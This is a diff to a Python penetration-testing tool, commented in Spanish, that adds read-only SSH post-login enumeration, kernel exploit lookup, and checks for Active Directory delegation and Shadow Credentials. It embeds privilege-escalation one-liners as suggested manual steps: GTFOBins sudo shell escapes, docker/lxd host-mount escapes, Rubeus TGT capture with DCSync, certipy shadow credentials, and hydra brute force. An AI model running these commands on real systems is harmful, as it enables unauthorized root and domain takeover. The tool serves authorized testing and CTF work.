@@ -2905,6 +2905,23 @@ def _parse_ldap_pre2k(out):
     return names
 
 
+def _parse_unconstrained_delegation(out):
+    """Equipos (NO DC) con delegación SIN restricciones (TRUSTED_FOR_DELEGATION, bit 0x80000 de
+    userAccountControl) de la salida de `ldapsearch ... (userAccountControl:1.2.840.113556.1.4.
+    803:=524288)` (LDIF). El propio filtro ya excluye los DC (primaryGroupID=516): ahí la
+    delegación sin restricciones es el diseño normal de AD, no un hallazgo — lo interesante es
+    un servidor miembro cualquiera con el flag puesto, que es lo que permite capturar el TGT de
+    cualquiera que se autentique contra él (coerción vía printer bug/PetitPotam + Rubeus
+    monitor). Solo lista NOMBRES (lectura); coercionar/capturar es la escalada activa, queda
+    como sugerencia manual. [] si no hay ninguno. Puro → testeable sin red."""
+    names = []
+    for block in re.split(r"\n\s*\n", out or ""):
+        m = re.search(r"^sAMAccountName:\s*(\S+)", block, re.M)
+        if m:
+            names.append(m.group(1))
+    return names
+
+
 def nxc_auth(nxc, proto, ip, res):
     """Fallback de credenciales por defecto: prueba null → guest → Administrator
     (todas con contraseña vacía) contra un protocolo de nxc y devuelve (user, label)
@@ -6605,6 +6622,353 @@ def _cc_nxc(res, nxc, nxc_proto, ip, creds, port=None):
     return hit
 
 
+# ═══════════ SSH: enumeración post-auth de SOLO LECTURA (Fase 5c/5d) ═══════════
+# Linux era donde palantir tenía MENOS peso: SMB/LDAP ya encadenan una enumeración completa
+# tras una credencial válida (--shares/--users/--pass-pol, AS-REP/Kerberoast…) pero SSH se
+# quedaba SOLO con el login confirmado — ni sudo -l, ni SUID/SGID/capabilities, ni el resto
+# del "linPEAS a mano" que es el primer paso de CUALQUIER escalada Linux real. Esto lo
+# corrige igual que la cadena SMB/LDAP: UNA conexión SSH extra (nunca el módulo ssh de nxc,
+# que tiene un bug de paramiko conocido y sin arreglo — ver _parse_nxc_bulk_successes), de
+# SOLO LECTURA (ningún comando escribe nada en el objetivo), que se PARA en detectar el
+# estado — igual que el chequeo de backup_operator: si sudo/SUID/capabilities muestran algo
+# abusable, el hallazgo trae el comando GTFOBins como paso MANUAL, nunca se ejecuta aquí.
+# No aplica a pass-the-hash (SSH no tiene NTLM) ni a autenticación por clave — solo contraseña.
+
+def _sshpass_bin():
+    """sshpass: ssh por sí solo no acepta la contraseña por stdin/argv para el LOGIN (pide
+    un prompt interactivo de verdad) — sshpass lo intercepta sin tocar el stdin/stdout del
+    COMANDO remoto una vez autenticado (eso es lo que se usa para 'sudo -S', ver abajo)."""
+    return _bin_with_sudo_fallback(("sshpass",))
+
+
+_SSH_ENUM_SECTIONS = ("id", "groups", "os", "sudo", "suid", "sgid", "caps", "cron")
+_SSH_ENUM_CMDS = {
+    "id": "id",
+    "groups": "groups",
+    "os": "cat /etc/os-release 2>/dev/null; echo; uname -a; echo; uname -r; echo; "
+          "sudo -V 2>/dev/null | head -1; echo; "
+          "(pkexec --version 2>/dev/null || dpkg -s policykit-1 2>/dev/null | grep -i '^Version' "
+          "|| rpm -q polkit 2>/dev/null)",
+    # -S: sudo lee la contraseña de SU PROPIO stdin — el mismo que alimenta esta conexión SSH
+    # (ver _ssh_post_enum, input_text), nunca por argv/echo (quedaría en el 'ps' del OBJETIVO).
+    "sudo": "sudo -S -l 2>&1",
+    # -xdev: no cruza a OTROS sistemas de ficheros montados (NFS, /proc, otro disco…) — un
+    # 'find /' sin esto puede tardar minutos o colgarse en un mount de red lento/caído.
+    "suid": "find / -xdev -perm -4000 -type f 2>/dev/null",
+    "sgid": "find / -xdev -perm -2000 -type f 2>/dev/null",
+    "caps": "getcap -r / 2>/dev/null",
+    "cron": "cat /etc/crontab 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null",
+}
+
+
+def _ssh_enum_script():
+    parts = []
+    for sec in _SSH_ENUM_SECTIONS:
+        parts.append(f"echo __PALANTIR_{sec.upper()}__")
+        parts.append(_SSH_ENUM_CMDS[sec])
+    return "; ".join(parts)
+
+
+def _split_ssh_enum(out):
+    """Divide la salida combinada de _ssh_enum_script() por sus marcadores → dict
+    sección→texto. Si una sección no aparece (p. ej. el script murió a mitad por un shell
+    restringido/rbash), simplemente no está en el dict — 'sin dato', nunca 'vacío=negativo'."""
+    secs = {}
+    pieces = re.split(r"__PALANTIR_([A-Z]+)__\s*\n?", out or "")
+    for i in range(1, len(pieces) - 1, 2):
+        secs[pieces[i].lower()] = pieces[i + 1].strip()
+    return secs
+
+
+_SUDO_LINE_RE = re.compile(r"^[ \t]*\(([^)]+)\)[ \t]*(NOPASSWD:\s*)?(.+?)[ \t]*$", re.M)
+
+
+def _parse_sudo_l(out):
+    """De la salida de 'sudo -l' → (all_nopasswd, all_pw, [binarios NOPASSWD concretos]).
+    Deliberadamente laxo (hay muchos formatos de sudoers): si no reconoce nada, devuelve
+    todo en False/[] y el operador sigue viendo la salida CRUDA en el paso — nunca se
+    pierde información, solo se deja de enriquecer con un hallazgo estructurado."""
+    all_nopasswd = all_pw = False
+    bins = []
+    for m in _SUDO_LINE_RE.finditer(out or ""):
+        nopasswd = bool(m.group(2))
+        cmds = m.group(3).strip()
+        if cmds == "ALL":
+            if nopasswd:
+                all_nopasswd = True
+            else:
+                all_pw = True
+        elif nopasswd:
+            for tok in re.split(r",\s*", cmds):
+                tok = tok.strip().split()[0] if tok.strip() else ""
+                if tok.startswith("/"):
+                    bins.append(Path(tok).name)
+    return all_nopasswd, all_pw, sorted(set(bins))
+
+
+# SUID/SGID de FÁBRICA (Debian/Ubuntu/RHEL/Arch confirmados) — cualquier basename que NO esté
+# aquí se marca como candidato a revisar en GTFOBins; un falso positivo solo cuesta un vistazo,
+# un falso negativo (binario propio con SUID real) es el bug que esto existe para evitar.
+_SUID_BASELINE = {
+    "sudo", "su", "passwd", "chsh", "chfn", "chage", "gpasswd", "newgrp", "mount", "umount",
+    "fusermount", "fusermount3", "pkexec", "ping", "ping6", "mtr-packet", "pppd",
+    "vmware-user-suid-wrapper", "ssh-keysign", "unix_chkpwd", "utempter", "Xorg.wrap",
+    "dbus-daemon-launch-helper", "polkit-agent-helper-1", "crontab", "at", "write", "wall",
+    "expiry", "newuidmap", "newgidmap", "pt_chown", "arping",
+}
+
+
+def _suid_interesting(paths_out):
+    return [p for p in (paths_out or "").splitlines() if p.strip() and Path(p.strip()).name not in _SUID_BASELINE]
+
+
+_DANGEROUS_CAPS = ("cap_setuid", "cap_setgid", "cap_dac_override", "cap_dac_read_search",
+                    "cap_sys_admin", "cap_sys_ptrace", "cap_sys_module", "cap_sys_rawio",
+                    "cap_chown", "cap_fowner")
+
+
+def _parse_caps(out):
+    """'getcap -r /' → [(ruta, caps)] para cada línea con una capability de la lista negra
+    anterior en modo +ep (efectivo/permitido) — el resto (p. ej. cap_net_bind_service, para
+    escuchar en puertos <1024 sin root) es ruido habitual que no es una vía de escalada."""
+    hits = []
+    for line in (out or "").splitlines():
+        line = line.strip()
+        if not line or "=" not in line:
+            continue
+        path, caps = line.split("=", 1)
+        if any(c in caps.lower() for c in _DANGEROUS_CAPS):
+            hits.append((path.strip(), caps.strip()))
+    return hits
+
+
+# GTFOBins (sección 'sudo') para los binarios NOPASSWD más vistos en CTF/OSCP — el resto cae
+# al enlace genérico de GTFOBins (siempre correcto, cubre cientos de binarios que no vale la
+# pena mantener a mano aquí). Nunca se EJECUTAN: son la sugerencia de paso manual del hallazgo.
+_GTFOBINS_SUDO_HINT = {
+    "find":     "sudo find . -exec /bin/sh -p \\; -quit",
+    "vim":      "sudo vim -c ':!/bin/sh'",
+    "vi":       "sudo vi -c ':!/bin/sh'",
+    "less":     "sudo less /etc/profile   # luego !/bin/sh",
+    "more":     "sudo more /etc/profile   # luego !/bin/sh",
+    "man":      "sudo man man   # luego !/bin/sh",
+    "awk":      "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
+    "python":   "sudo python -c 'import os; os.system(\"/bin/sh\")'",
+    "python3":  "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
+    "perl":     "sudo perl -e 'exec \"/bin/sh\";'",
+    "ruby":     "sudo ruby -e 'exec \"/bin/sh\"'",
+    "php":      "sudo php -r 'system(\"/bin/sh\");'",
+    "env":      "sudo env /bin/sh",
+    "docker":   "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+    "nmap":     "sudo nmap --interactive   # solo nmap <5.21; si no, revisa GTFOBins para tu versión",
+    "systemctl": "sudo systemctl status   # luego !/bin/sh (usa pager) — o 'systemctl link/enable' una unit propia",
+    "journalctl": "sudo journalctl   # luego !/bin/sh (usa pager)",
+    "git":      "sudo git -p help   # luego !/bin/sh (usa pager)",
+    "gdb":      "sudo gdb -nx -ex '!sh' -ex quit",
+    "tar":      "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+}
+
+
+_OS_KERNEL_RE = re.compile(r"^(\d+\.\d+\.\d+\S*)\s*$", re.M)
+_OS_SUDO_RE = re.compile(r"Sudo version\s+(\S+)", re.I)
+_OS_POLKIT_RE = re.compile(r"pkexec version\s+(\S+)|[Vv]ersion:\s*(\S+)")
+
+
+def _parse_os_versions(out):
+    """De la sección 'os' del script de enumeración SSH (uname -r / sudo -V / pkexec --version
+    en líneas propias) → (kernel, sudo_ver, polkit_ver), cada uno None si no se pudo determinar.
+    Alimenta searchsploit/linux-exploit-suggester con datos que nmap NUNCA podría ver (vienen de
+    dentro del objetivo, no de un banner de red). Puro → testeable sin red."""
+    out = out or ""
+    m_k = _OS_KERNEL_RE.search(out)
+    m_s = _OS_SUDO_RE.search(out)
+    m_p = _OS_POLKIT_RE.search(out)
+    kernel = m_k.group(1) if m_k else None
+    sudo_ver = m_s.group(1) if m_s else None
+    polkit_ver = (m_p.group(1) or m_p.group(2)) if m_p else None
+    return kernel, sudo_ver, polkit_ver
+
+
+def _les_bin():
+    """linux-exploit-suggester.sh (mzet-/linux-exploit-suggester, github.com/mzet-/linux-exploit-
+    suggester — NO está en apt): se ejecuta SIEMPRE EN LOCAL con -k <versión> (nunca contra el
+    objetivo) — cruza una cadena de versión de kernel contra su base CURADA de CVEs de privesc,
+    sin tocar la red ni el objetivo. Confirmado en su código fuente real (parseUname/-k, el bucle
+    final que imprime cada entrada) — ver _parse_les."""
+    return _bin_with_sudo_fallback(("les.sh", "linux-exploit-suggester.sh"), home_dirs=(".local/bin",))
+
+
+# Formato REAL confirmado en el código fuente de linux-exploit-suggester.sh (el bucle final que
+# imprime cada entrada ordenada por Rank): 'echo -e "[+] $NAME"' donde $NAME ya trae
+# '[CVE-x]  título' (con color ANSI alrededor del CVE, que run_capture ya quita), seguido por
+# '   Exposure: <nivel>' en una línea propia ('highly probable'/'probable'/'less probable',
+# ver su función displayExposure). _ANSI_RE por si se llama con salida cruda sin pasar por
+# run_capture (p. ej. un test).
+_LES_ENTRY_RE = re.compile(r"^\[\+\]\s+\[(CVE-\d{4}-\d+)\]\s*(.+?)\s*$\n(?:.*\n)*?^\s*Exposure:\s*(.+?)\s*$", re.M)
+_LES_EXPOSURE_SEV = {"highly probable": "critica", "probable": "alta", "less probable": "media"}
+
+
+def _parse_les(out):
+    """[(cve, nombre, exposure)] de la salida real de linux-exploit-suggester.sh -k <versión> —
+    ver _LES_ENTRY_RE para la confirmación contra su código fuente. [] si no hay ninguna
+    coincidencia o el binario no corrió. Puro → testeable sin red."""
+    out = _ANSI_RE.sub("", out or "")
+    return [(m.group(1), m.group(2), m.group(3)) for m in _LES_ENTRY_RE.finditer(out)]
+
+
+def _kernel_exploit_suggest(res, kernel_ver):
+    """linux-exploit-suggester.sh -k <kernel_ver> EN LOCAL (nunca en el objetivo — ver _les_bin):
+    el homólogo de searchsploit (Fase 5b) pero con una base curada específica de privesc de
+    kernel, mucho menos ruidosa ahí que el matching genérico de exploit-db. Solo DETECTA/
+    sugiere: cada CVE queda como paso MANUAL (descargar/compilar/verificar el PoC), nunca se
+    ejecuta ni se compila nada aquí — mismo principio que el resto de palantir."""
+    les = _les_bin()
+    if not les:
+        res["missing"].append("linux-exploit-suggester")
+        return
+    rc, out = run_capture([les, "-k", kernel_ver], timeout=30, quiet=True)
+    hits = _parse_les(out)
+    _step(res, f"{Path(les).name} -k {kernel_ver}", bool(hits), out,
+          note="linux-exploit-suggester EN LOCAL (nunca contra el objetivo): cruza la versión de "
+               "kernel con su base curada de CVEs de privesc — punto de partida, hay falsos positivos")
+    if not hits:
+        return
+    real = [(cve, name, exp) for cve, name, exp in hits if _LES_EXPOSURE_SEV.get(exp.lower()) in ("critica", "alta")]
+    if real:
+        worst = "critica" if any(_LES_EXPOSURE_SEV[e.lower()] == "critica" for _c, _n, e in real) else "alta"
+        shown = ", ".join(f"{cve} ({name}, {exp})" for cve, name, exp in real[:5])
+        res["findings"].append((worst, f"kernel {kernel_ver}: {len(real)} exploit(s) 'probable'/'highly "
+            f"probable' en linux-exploit-suggester — {shown}" + (" …" if len(real) > 5 else "")))
+        res["next"].append(f"{Path(les).name} -k {kernel_ver} -f   # detalle completo (-f): URL de descarga "
+            "del PoC de cada CVE de arriba — compílalo/verifícalo a mano, nunca a ciegas")
+    else:
+        res["findings"].append(("info", f"kernel {kernel_ver}: {len(hits)} exploit(s) en linux-exploit-"
+            "suggester, todos 'less probable' (ruido histórico típico en kernels ya parcheados)"))
+
+
+def _ssh_post_enum(res, ip, port, user, password):
+    """Fase 5c/5d por SSH: con una credencial de SOLO CONTRASEÑA ya confirmada, corre UNA
+    conexión extra de SOLO LECTURA (nunca el módulo ssh de nxc) con id/groups/os/sudo -l/
+    SUID/SGID/capabilities/cron — exactamente lo que linPEAS mira primero a mano. El
+    llamante decide CUÁNDO llamar (1 vez por protocolo, igual que _creds_enum/_db_enum)."""
+    sshpass = _sshpass_bin()
+    if not sshpass:
+        res["missing"].append("sshpass")
+        res["next"].append(
+            f"ssh {user}@{ip} -p {port} 'sudo -l; find / -xdev -perm -4000 -type f 2>/dev/null; "
+            "getcap -r / 2>/dev/null'   # enum post-auth manual (instala sshpass para que palantir lo automatice)")
+        return
+    import tempfile
+    pf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".pw")
+    pf.write((password or "") + "\n")
+    pf.close()
+    os.chmod(pf.name, 0o600)
+    try:
+        cmd = [sshpass, "-f", pf.name, "ssh",
+               "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+               "-o", "ConnectTimeout=10", "-o", "PreferredAuthentications=password",
+               "-o", "PubkeyAuthentication=no", "-p", str(port), f"{user}@{ip}",
+               _ssh_enum_script()]
+        rc, out = run_capture(cmd, timeout=60, input_text=(password or "") + "\n", quiet=True)
+    finally:
+        try:
+            os.unlink(pf.name)
+        except OSError:
+            pass
+    shown = f"ssh {user}@{ip} -p {port} '<enum de solo lectura: id/sudo -l/SUID/SGID/capabilities/cron>'"
+    secs = _split_ssh_enum(out)
+    _step(res, shown, bool(secs), _mask_out(out, password),
+          note="enumeración post-auth de solo lectura (equivalente al primer barrido de linPEAS) con la credencial ya confirmada")
+    if not secs:
+        res["findings"].append(("info", f"SSH ({user}): login confirmado pero la enumeración post-auth no "
+            "devolvió nada reconocible (¿shell restringida/rbash? revisa el paso crudo arriba)."))
+        return
+
+    groups_txt = secs.get("groups", "")
+    for grp, sev, hint in (
+        ("docker", "critica", "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"),
+        ("lxd", "critica", "lxc init ubuntu:18.04 pwn -c security.privileged=true && "
+                            "lxc config device add pwn hostfs disk source=/ path=/mnt/root recursive=true && "
+                            "lxc start pwn && lxc exec pwn /bin/sh"),
+        ("lxc", "critica", "lxc init ubuntu:18.04 pwn -c security.privileged=true && "
+                            "lxc config device add pwn hostfs disk source=/ path=/mnt/root recursive=true && "
+                            "lxc start pwn && lxc exec pwn /bin/sh"),
+        ("disk", "alta", "debugfs /dev/sda1   # o mount/dd del dispositivo — acceso crudo al disco"),
+    ):
+        if re.search(rf"\b{grp}\b", groups_txt):
+            res["findings"].append((sev, f"SSH ({user}): en el grupo «{grp}» — equivalente a root en este host"))
+            res["next"].append(f"{hint}   # grupo «{grp}» confirmado por 'groups' arriba")
+
+    sudo_raw = secs.get("sudo", "")
+    all_nopasswd, all_pw, sudo_bins = _parse_sudo_l(sudo_raw)
+    if all_nopasswd:
+        res["findings"].append(("critica", f"SSH ({user}): sudo SIN contraseña para TODOS los comandos (NOPASSWD: ALL)"))
+        res["next"].append(f"ssh {user}@{ip} -p {port} 'sudo /bin/sh'   # NOPASSWD: ALL confirmado por sudo -l")
+    elif all_pw:
+        res["findings"].append(("critica", f"SSH ({user}): sudo para TODOS los comandos — probablemente la misma "
+            f"contraseña que «{user}» ya usa para SSH"))
+        res["next"].append(f"ssh {user}@{ip} -p {port} -t 'sudo /bin/sh'   # pide contraseña, prueba la de SSH")
+    elif sudo_bins:
+        shown_bins = ", ".join(sudo_bins[:8]) + (" …" if len(sudo_bins) > 8 else "")
+        res["findings"].append(("alta", f"SSH ({user}): sudo NOPASSWD en binario(s) concreto(s) — {shown_bins}"))
+        for b in sudo_bins[:8]:
+            res["next"].append((f"{_GTFOBINS_SUDO_HINT[b]}   # NOPASSWD confirmado por sudo -l" if b in _GTFOBINS_SUDO_HINT
+                                 else f"https://gtfobins.github.io/gtfobins/{b}/#sudo   # NOPASSWD confirmado por sudo -l"))
+    elif re.search(r"must have a tty|a password is required|no tty present", sudo_raw, re.I):
+        res["findings"].append(("info", f"SSH ({user}): «sudo -l» no se pudo listar sin tty (sudoers con "
+            f"requiretty) — pruébalo a mano: ssh {user}@{ip} -p {port} -t 'sudo -l'"))
+
+    suid_extra = _suid_interesting(secs.get("suid", ""))
+    if suid_extra:
+        shown = ", ".join(suid_extra[:8]) + (" …" if len(suid_extra) > 8 else "")
+        res["findings"].append(("alta", f"SSH ({user}): binario(s) SUID fuera de los de fábrica — {shown}"))
+        for pth in suid_extra[:8]:
+            res["next"].append(f"https://gtfobins.github.io/gtfobins/{Path(pth).name}/#suid   # SUID confirmado: {pth}")
+
+    sgid_extra = _suid_interesting(secs.get("sgid", ""))
+    if sgid_extra:
+        shown = ", ".join(sgid_extra[:8]) + (" …" if len(sgid_extra) > 8 else "")
+        res["findings"].append(("media", f"SSH ({user}): binario(s) SGID fuera de los de fábrica — {shown}"))
+
+    caps = _parse_caps(secs.get("caps", ""))
+    if caps:
+        shown = ", ".join(f"{Path(p).name} ({c})" for p, c in caps[:8])
+        res["findings"].append(("alta", f"SSH ({user}): capability(ies) peligrosa(s) — {shown}"))
+        for p, _c in caps[:8]:
+            res["next"].append(f"https://gtfobins.github.io/gtfobins/{Path(p).name}/#capabilities   # capability confirmada: {p}")
+
+    cron_lines = [l for l in secs.get("cron", "").splitlines() if l.strip() and not l.strip().startswith("#")]
+    if cron_lines:
+        res["findings"].append(("media", f"SSH ({user}): crontab/cron.d con entrada(s) propias — revisa si algún "
+            "script referenciado es escribible por ti (privesc clásico: cron de root ejecuta un script tuyo)"))
+
+    # Versión de kernel/sudo/polkit — dato que nmap NUNCA podría ver (viene de DENTRO del
+    # objetivo). Kernel → linux-exploit-suggester EN LOCAL (base curada, ver _kernel_exploit_
+    # suggest); sudo/polkit → el MISMO searchsploit offline que ya usa la Fase 5b (Baron
+    # Samedit/CVE-2021-3156 y PwnKit/CVE-2021-4034 son justo lo que esto destapa en la práctica).
+    kernel_ver, sudo_ver, polkit_ver = _parse_os_versions(secs.get("os", ""))
+    if kernel_ver:
+        _kernel_exploit_suggest(res, kernel_ver)
+    if sudo_ver or polkit_ver:
+        if have("searchsploit"):
+            for prod, ver in (("Sudo", sudo_ver), ("Polkit", polkit_ver)):
+                if not ver:
+                    continue
+                ss_hits, ss_term = [], ""
+                for term in _ss_terms(prod, ver):
+                    ss_term = term
+                    ss_hits = searchsploit_one(term)
+                    if ss_hits:
+                        break
+                if ss_hits:
+                    shown = ", ".join(h["title"][:60] for h in ss_hits[:3])
+                    res["findings"].append(("media", f"SSH ({user}): {prod} {ver} — {len(ss_hits)} exploit(s) "
+                        f"en exploit-db (p.ej. {shown}) — verifica con 'searchsploit -x EDB-ID' antes de usar"))
+                    res["next"].append(f"searchsploit {ss_term}   # {len(ss_hits)} resultado(s) para {prod} {ver}")
+        else:
+            res["missing"].append("searchsploit")
+
+
 def cc_ftp(ip, ports, deep):
     res = _cc_res("ftp", "FTP", [p["port"] for p in ports])
     nxc = nxc_bin()
@@ -6622,7 +6986,11 @@ def cc_ssh(ip, ports, deep):
     nxc = nxc_bin()
     if nxc:
         for p in ports:
-            _cc_nxc(res, nxc, "ssh", ip, DEFAULT_CREDS["ssh"], port=p["port"])
+            hit = _cc_nxc(res, nxc, "ssh", ip, DEFAULT_CREDS["ssh"], port=p["port"])
+            # Credencial por defecto válida → la MISMA enum post-auth de solo lectura que la
+            # Fase 5d (sudo -l/SUID/capabilities…), no solo el login — ver _ssh_post_enum.
+            if hit and hit[1]:
+                _ssh_post_enum(res, ip, p["port"], hit[0], hit[1])
     else:
         res["missing"].append("nxc/netexec")
     res["next"].append(f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{ip}   # fuerza bruta real (manual)")
@@ -8849,6 +9217,19 @@ def _surface_acl_abuse(res, nxc, ip, u, secret, is_hash, domain, base_dn, auth_a
                     "contraseña DIRECTAMENTE y entrar como ella (no hace falta meterse en ningún grupo)")
         if rights and _add_once(res, "critica", _acc_txt, f"ACL cuenta {acc}", seen):
             _attach_cmd(res, _acc_txt, _acl_abuse_cmds(rights, acc, u, secret, is_hash, domain, ip, kind="account"))
+            # Alternativa a 'set password': Shadow Credentials (msDS-KeyCredentialLink) con certipy
+            # — el camino REAL en varios writeups de AD recientes (Certified/Logging/TombWatcher…,
+            # operador: técnica más citada en writeups de ACL abuse) cuando la cuenta de alto valor
+            # es una gMSA/cuenta de EQUIPO (su contraseña la gestiona el KDS root key del DC, NO se
+            # puede poner por LDAP) o exige 'Smart card is required' (rompe el login por contraseña
+            # pero NO el PKINIT por certificado) — en ambos casos GenericWrite/GenericAll SÍ permite
+            # añadir una credencial de certificado propia y sacar el hash NT autenticándose con ella.
+            if domain and any(r in rights for r in ("GenericAll", "FullControl", "GenericWrite", "WriteProperties", "Self")):
+                _shadow_shown = ("-hashes " + _sec_disp(secret, True)) if is_hash else ("-p " + _sec_disp(secret))
+                res["next"].append(
+                    f"certipy shadow auto -u {shlex.quote(u + '@' + domain)} {_shadow_shown} -account {shlex.quote(acc)} "
+                    f"-dc-ip {ip}   # alternativa a 'set password': Shadow Credentials — necesaria si '{acc}' es "
+                    "una gMSA/cuenta de equipo o exige smart card (ahí un reset de contraseña normal no vale)")
 
 
 def _parse_nxc_userlist(out):
@@ -9421,6 +9802,32 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
                             "confirmada(s) arriba: intenta pedir un TGT con la contraseña por defecto de cada una "
                             "(nombre de equipo en minúsculas, sin '$', recortado a 14 car.) — paso MANUAL, es una "
                             "contraseña adivinada (1 intento/cuenta), no se ejecuta solo")
+                    # Delegación SIN RESTRICCIONES (TRUSTED_FOR_DELEGATION, operador: visto en varios
+                    # writeups de AD de dificultad media/alta — Sauna/Reel/Forest/Sizzle-style — como
+                    # precondición habitual de coerción+captura de TGT). El filtro LDAP (matching rule
+                    # 1.2.840.113556.1.4.803 = AND bit a bit) ya excluye los DC vía primaryGroupID=516:
+                    # ahí es el diseño normal de AD, el hallazgo real es un servidor MIEMBRO con el flag.
+                    # Mismo bind ya autenticado que trusts/pre2k — SOLO LECTURA, ninguna coerción aquí.
+                    rc, udout = _run_capture_retry(
+                        ["ldapsearch", "-x", "-o", "ldif-wrap=no", "-H", f"ldap://{ip}", "-D", f"{u}@{domain}", "-y", sec_file.name,
+                         "-b", base_dn, "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))",
+                         "sAMAccountName"], timeout=30, quiet=True)
+                    udshown = (f"ldapsearch -x -H ldap://{ip} -D {shlex.quote(u + '@' + domain)} -y *** "
+                              f"-b {shlex.quote(base_dn)} '(&(objectCategory=computer)(userAccountControl:...:=524288)(!(primaryGroupID=516)))'")
+                    unconstrained = _parse_unconstrained_delegation(udout)
+                    _step(res, udshown, bool(unconstrained), mask(udout),
+                          note="¿algún equipo NO-DC tiene delegación sin restricciones (TRUSTED_FOR_DELEGATION)? — solo lectura")
+                    if unconstrained:
+                        _ud_txt = (f"AD (cred {u}): delegación SIN RESTRICCIONES en equipo(s) NO-DC — " +
+                                   ", ".join(unconstrained[:10]) + (" …" if len(unconstrained) > 10 else "") +
+                                   " — cualquiera que se autentique contra ese equipo (coaccionado vía PrinterBug/"
+                                   "PetitPotam, ver Spooler/MSRPC arriba si palantir lo confirmó) deja su TGT "
+                                   "capturable ahí")
+                        if _add_once(res, "critica", _ud_txt, "unconstrained-deleg", seen):
+                            res["next"].append(
+                                f"Rubeus.exe monitor /interval:5 /nowrap   # en el equipo con delegación sin "
+                                "restricciones, mientras coaccionas (coercer/coerce_plus, ver Spooler arriba) "
+                                "a un DC para que se autentique contra él — captura su TGT y haz DCSync con él")
                 # PSO/FGPP (Fine-Grained Password Policy): política de contraseñas POR GRUPO/USUARIO,
                 # que puede ser MÁS LAXA que la del dominio entero (--pass-pol de arriba) — p. ej. una
                 # cuenta de servicio con una FGPP sin complejidad aunque el dominio sí la exija. Ya no
@@ -10721,6 +11128,9 @@ def provided_creds_check(ip, services, creds, bulk=None, local_auth=False, is_ha
                     # bucle de bulk — no son protocolos de nxc, ver _db_cred_test más arriba).
                     enriched.add(np)   # BD: lista bases/tablas no de sistema + impersonación/linked/sysadmin
                     _db_enum(res, np, ip, port, hit["user"], hit["password"], base, is_hash=is_hash)
+                elif np == "ssh" and not is_hash and np not in enriched and hit["user"] and hit["password"]:
+                    enriched.add(np)   # Linux: sudo -l/SUID/SGID/capabilities/cron — ver _ssh_post_enum
+                    _ssh_post_enum(res, ip, port, hit["user"], hit["password"])
         for u, p in creds:
             sec_file = None
             if p and not is_hash:
@@ -10841,6 +11251,9 @@ def provided_creds_check(ip, services, creds, bulk=None, local_auth=False, is_ha
             elif (ok or pwn) and np == "mssql" and np not in enriched:   # mysql/postgres: ver _db_cred_test arriba
                 enriched.add(np)   # BD: lista bases/tablas no de sistema (+ impersonación/linked/sysadmin en MSSQL)
                 _db_enum(res, np, ip, port, u, p, base, is_hash=is_hash)
+            elif (ok or pwn) and np == "ssh" and not is_hash and np not in enriched:
+                enriched.add(np)   # Linux: sudo -l/SUID/SGID/capabilities/cron — ver _ssh_post_enum
+                _ssh_post_enum(res, ip, port, u, p)
     # RETROALIMENTACIÓN: reprueba todo lo descubierto (logins válidos + creds/hashes volcados) contra
     # el resto de servicios y enumera lo que abra — puede destapar más credenciales en cadena. Si
     # esto revienta a medias (p. ej. una credencial con un carácter que nxc no esperaba) NO debe
@@ -13049,6 +13462,29 @@ def selftest():
     assert "CT059@172.16.7.3" in _acl_h_next, _acl_h_next
     assert "CT059:aad3...:abcd1234@172.16.7.3" not in _acl_h_next, _acl_h_next   # formato viejo (incorrecto con hash) ya no sale
 
+    # Shadow Credentials: GenericAll DIRECTO (no WriteDACL-con-2-pasos) sobre una cuenta de alto
+    # valor sugiere 'certipy shadow auto' ADEMÁS de 'set password' — la vía real cuando esa cuenta
+    # es una gMSA/equipo o exige smart card (ahí un reset de contraseña normal no vale). Con solo
+    # WriteDACL (fixture de arriba, _acl_res) NO debe aparecer: ahí aún no hay GenericAll directo.
+    def _fake_daclread_shadow(cmd, timeout=None, quiet=False, **kw):
+        s = " ".join(cmd)
+        if "TARGET=Administrator" in cmd and "RIGHTS=ResetPassword" not in s:
+            return 0, ("LDAP x 389 DC ACE[2] info\nLDAP x 389 DC \tAccess mask               : GenericAll (0x10000000)\n"
+                       "LDAP x 389 DC \tTrustee (SID)             : DOM\\CT059 (S-1-5-21-1-2-3-1130)")
+        return 0, "LDAP x 389 DC [*] sin ACE para este principal"
+    globals()["_run_capture_retry"] = _fake_daclread_shadow
+    _acl_sh = _fp("reuse-ldap", "x", [389])
+    try:
+        _surface_acl_abuse(_acl_sh, "FAKE_NXC", "172.16.7.3", "CT059", "charlie1", False,
+                           "inlanefreight.local", "dc=inlanefreight,dc=local",
+                           ["-u", "CT059", "-p", "/tmp/x.pw"], "-u CT059 -p '***'", set())
+    finally:
+        globals()["_run_capture_retry"] = _real_rcr_acl2
+    _acl_sh_next = " ".join(_acl_sh["next"])
+    assert "certipy shadow auto -u CT059@inlanefreight.local -p charlie1 -account Administrator -dc-ip 172.16.7.3" in _acl_sh_next, _acl_sh_next
+    assert "gMSA/cuenta de equipo o exige smart card" in _acl_sh_next, _acl_sh_next
+    assert not any("certipy shadow auto" in n for n in _acl_res["next"]), _acl_res["next"]   # WriteDACL-only: no aplica
+
     # BUG: GenericAll sobre el DOMINIO raíz (sin ACE con GUID DCSync) también implica DCSync — la
     # primera pasada con RIGHTS=DCSync no lo detecta (filtra por GUID), la 2a sin filtro sí. Caso real.
     _real_rcr_acl3 = _run_capture_retry
@@ -13413,6 +13849,146 @@ def selftest():
         globals()["run_capture"] = _real_rc_gm
     assert any(s == "media" and "anónimo" in t for s, t in _ftp_an["findings"]), _ftp_an["findings"]
     assert not any("credencial por defecto válida" in t for _s, t in _ftp_an["findings"]), _ftp_an["findings"]
+
+    # ── SSH: enumeración post-auth de solo lectura (sudo -l/SUID/SGID/capabilities/cron) ──────
+    # Linux era donde palantir tenía menos peso: SMB/LDAP ya encadenaban --shares/--users/roasting
+    # tras una credencial válida, pero SSH se quedaba SOLO con el login — ver _ssh_post_enum.
+    assert _split_ssh_enum("__PALANTIR_ID__\nroot\n__PALANTIR_GROUPS__\nroot docker\n") == {
